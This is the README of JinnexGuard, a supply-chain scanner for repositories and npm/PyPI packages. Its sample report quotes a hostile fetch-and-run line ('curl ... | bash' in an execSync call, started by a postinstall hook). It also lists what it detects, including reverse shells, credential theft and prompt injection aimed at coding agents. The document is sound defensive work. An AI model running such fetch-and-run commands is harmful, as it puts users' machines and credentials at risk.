# JinnexGuard

Risk signals for a GitHub repository or an npm/PyPI package, **with evidence**.
Run it **before** you install, clone or run something you don't know — before
`npx … setup`, `npm install` or `pip install`. For a package, it compares
**what actually gets installed** with the repository it claims to come from.

```console
$ jinnexguard ./demo-helper
Target: ./demo-helper  (local)
Status: complete — Risk signals, not a trust verdict. Review the evidence of each finding.
Signals: 🔴 1 critical, 🟠 1 high

🔴 [CRITICAL] Downloads and runs a remote script (curl|bash) (scripts/setup.js)
   at scripts/setup.js:2
   evidence: execSync("curl -fsSL https://get.example.dev/init.sh | bash");
   Fetches code from the internet and runs it right away; nobody sees what it is.

🟠 [HIGH] npm runs 'postinstall' on install (package.json)
   at package.json:5
   evidence: postinstall: node scripts/setup.js
   This script runs on its own with `npm install`, without confirmation. It is the classic npm malware vector. Read the whole command.
```

## Principles

- **No "trusted" verdict.** A green badge that is wrong is worse than none: it
  lowers your guard. Some of the worst supply-chain attacks (xz-utils,
  event-stream) came from projects with a spotless reputation. JinnexGuard
  **surfaces signals with evidence** — file, line and the actual snippet — and
  leaves the judgment to you.
- **It never runs the target's code.** Repositories are cloned shallow, with
  git hooks disabled and without submodules; packages are downloaded and
  extracted as data. Files are only read.
- **The engine is pure standard library**, on purpose: easy to audit and no
  dependencies to watch. Only the optional MCP layer adds one (`mcp`).

## Install

Requires Python 3.11+ and `git`. Works on Linux, macOS and Windows.

```bash
pipx install jinnexguard          # or: uv tool install jinnexguard
uvx jinnexguard owner/repo        # run once without installing
pip install jinnexguard           # inside a virtual environment
```

For the MCP server, add the `mcp` extra: `pipx install 'jinnexguard[mcp]'`.

## Usage

```bash
jinnexguard owner/repo                    # a GitHub repository
jinnexguard https://gitlab.com/group/project
jinnexguard ./path/to/a/repo              # a local folder
jinnexguard npm:some-package              # what npm installs vs. its repository
jinnexguard pypi:some-package==1.2.3      # a specific version
jinnexguard owner/repo --online           # add reputation from the GitHub API
jinnexguard ./my-repo --history           # secrets anywhere in git history
jinnexguard owner/repo --json             # machine-readable report
jinnexguard owner/repo --full             # do not group repeated findings
```

Targets can be `owner/repo`, an `https://` URL on GitHub, GitLab, Codeberg or
Bitbucket, a local folder, `npm:name[@version]` or `pypi:name[==version]`.

### Exit codes

| Code | Meaning |
| ---- | ------- |
| `0`–`4` | Highest severity found: `0` info, `1` low, `2` medium, `3` high, `4` critical |
| `10` | The scan failed or was incomplete — it never passes as clean |

That makes it usable as a gate in a hook or CI job, for example
`jinnexguard . || [ $? -lt 3 ]` to fail only on high or critical.

### As an MCP server

The same server works with any MCP client: Claude Code, Codex, Cursor, Gemini
CLI and others. With Claude Code:

```bash
claude mcp add --scope user jinnexguard -- uvx --from 'jinnexguard[mcp]' jinnexguard-mcp
```

For clients configured with JSON:

```json
{
  "mcpServers": {
    "jinnexguard": {
      "command": "uvx",
      "args": ["--from", "jinnexguard[mcp]", "jinnexguard-mcp"]
    }
  }
}
```

It exposes one tool: `assess_repo(target, online=False, history=False, full=False)`.

## What it checks

In a git repository it scans what a commit would include (tracked files plus
new files that are not ignored); a folder without `.git` is scanned entirely.

1. **Install-time scripts** — npm lifecycle hooks, `setup.py` and Python build
   backends, `.pth` files, devcontainers, VS Code tasks that start on their
   own, and dependencies that ship their own install script.
2. **Dangerous patterns** — `curl | bash`, reverse shells, obfuscated code that
   gets executed, code downloaded and run, hard-coded IP addresses, `sudo` and
   friends, invisible bidirectional characters (Trojan Source).
3. **Credential theft and exfiltration** — reads of local credential files,
   dumps of the whole environment, data sent to known collection endpoints.
4. **Secrets in the code** — provider tokens (GitHub, Anthropic, OpenAI, AWS,
   Google, Slack, Stripe and more), private keys and hard-coded credentials.
   **Evidence is masked**, so the report is safe to share.
5. **Secrets in git history** (optional, `--history`) — keys that are gone from
   the current code but still live in a commit.
6. **AI agents** — what a repository does to, or tells, your coding agent: code
   that edits agent configuration or adds persistence, instruction files
   (`SKILL.md`, `AGENTS.md`, `CLAUDE.md`, `.cursorrules`…), signs of prompt
   injection in docs and hidden comments, project settings an agent loads
   (`.claude/settings.json`, `.mcp.json`), and AI CLIs launched without their
   safeguards.
7. **MCP tool descriptions** — the text an MCP server sends to the model on
   every call: tool descriptions (including Python tool docstrings) and
   parameter descriptions, in Python and JavaScript/TypeScript. That text is
   part of the prompt and a clean README says nothing about it. JinnexGuard
   lists it and looks for invisible text, instructions aimed at the agent
   rather than at describing the tool, and descriptions that are built or
   downloaded when the server runs.
8. **Network destinations** — the hosts named in the code, listed in one place
   so you can see where a tool or an MCP server may talk to, and settings that
   point your AI agent at someone else's server (`ANTHROPIC_BASE_URL`,
   `OPENAI_BASE_URL` and similar): through that server pass your prompts, your
   code and your API key.
9. **Repository supply chain** — GitHub Actions workflows with dangerous
   triggers or permissions, shell injection in `run:`, actions not pinned to a
   commit SHA, submodules.
10. **Impersonation** — package names that are nearly identical to popular ones.
10. **Precompiled binaries** — programs, libraries and kernel drivers committed
    to the repository (Windows, Linux and macOS formats, recognized by their
    headers and never run), and whether the code, a script or the agent
    instructions start them. Nobody can check that a binary matches its source.
11. **Published package vs. repository** — what `npm install` or `pip install`
    downloads does not have to come from the repository shown on its page (the
    xz-utils backdoor lived in the release tarball, not in git). JinnexGuard
    downloads the artifact, extracts it as data and compares it with the
    repository at that version's commit or tag, using provenance (npm SLSA,
    PyPI Trusted Publishing) when it exists.
12. **Reputation** (optional, `--online`) — age, stars vs. age, owner account.
    Context, not a verdict.

JinnexGuard looks at a server before you install it. What a running server
advertises can still change afterwards, so pair it with a runtime scanner such
as [Snyk Agent Scan](https://github.com/snyk/agent-scan) (formerly mcp-scan).

Each finding has a severity (`info` to `critical`), a file, a line and the
actual snippet. Repeated findings are grouped with a `count` and
`more_locations`; `--full` (CLI) or `full=True` (MCP) lists them one by one.

## The report quotes untrusted content

Evidence, paths and titles come from the target, and a malicious README could
try to slip an instruction into them for the agent that reads the report. So
evidence is truncated, invisible characters are shown escaped, and every report
carries an `untrusted_content` field stating that all of it is data, never
instructions.

## Limits

JinnexGuard finds signals through patterns; it does not prove that a
repository or package is safe.

## Development

```bash
git clone https://github.com/ricardorincon719/jinnexguard.git
cd jinnexguard
python -m venv .venv && . .venv/bin/activate
pip install -e '.[mcp]'
python -m unittest discover -s tests
```

## Security

If you find a vulnerability in JinnexGuard itself, please report it privately
as described in
[SECURITY.md](https://github.com/ricardorincon719/jinnexguard/blob/main/SECURITY.md),
not in a public issue.

## License

[Apache License 2.0](https://github.com/ricardorincon719/jinnexguard/blob/main/LICENSE).
